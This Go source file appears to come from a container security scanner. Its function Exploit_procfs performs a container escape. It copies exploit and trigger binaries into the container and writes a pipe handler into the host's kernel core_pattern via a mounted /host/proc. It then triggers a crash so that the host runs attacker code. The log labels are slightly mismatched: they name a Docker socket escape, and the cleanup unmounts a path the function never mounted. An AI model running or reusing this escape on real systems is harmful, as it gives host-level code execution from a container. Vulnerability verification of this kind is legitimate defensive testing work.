package exp

import (
	"Container_runtime_scanner/internal/docker"
	"fmt"
	"log"
	"os"
	"regexp"
)

func Exploit_procfs(logger *log.Logger, cont *docker.Container) {
	logger.Println("挂载Docker Socket逃逸")
	err := cont.CopyFileToContainer("procfs_exp", "/tmp/procfs_exp")
	if err != nil {
		fmt.Println("写入失败")
	}

	err1 := cont.CopyFileToContainer("procfs_trigger", "/tmp/procfs_trigger")
	if err1 != nil {
		fmt.Println("写入失败")
	}
	intermediate := cont.ShExecStep("cat /proc/mounts | xargs -d ',' -n 1 | grep workdir")
	container_hash := ExtractContainerHash(intermediate)
	cont.ShExecStep("echo -e \"|/var/lib/docker/overlay2/" + container_hash + "/merged/tmp/procfs_exp \\rcore    \" >  /host/proc/sys/kernel/core_pattern")

	cont.ShExecStep("chmod +x /tmp/procfs_trigger")

	cont.ShExecStep(". /tmp/procfs_trigger")

	if CheckFileExists("Container_runtime_scanner_copy") {
		logger.Println("验证漏洞成功，并成功逃逸·")
	} else {
		logger.Println("逃逸失败")
	}

	logger.Println("删除测试记录")
	cont.ShExecStep("umount -f /test2")
	cont.ShExecStep("rm -r /test2")
	logger.Println("----------------------")

}
func ExtractContainerHash(path string) string {
	// 使用正则表达式匹配 overlay2/ 后面的哈希值
	// 哈希值通常是一串字母数字组合
	re := regexp.MustCompile(`overlay2/([a-f0-9]+)/`)

	// 查找匹配项
	matches := re.FindStringSubmatch(path)

	// 如果找到匹配项，返回捕获组中的哈希值
	if len(matches) >= 2 {
		return matches[1]
	}

	// 如果没有找到匹配项，返回空字符串
	return ""
}

func CheckFileExists(tmpfile string) bool {
	filePath := fmt.Sprintf("/tmp/%s", tmpfile)

	// 读取日志文件内容
	_, err := os.Stat(filePath)
	// 明确检查错误类型是否为"不存在"
	return !os.IsNotExist(err)

}
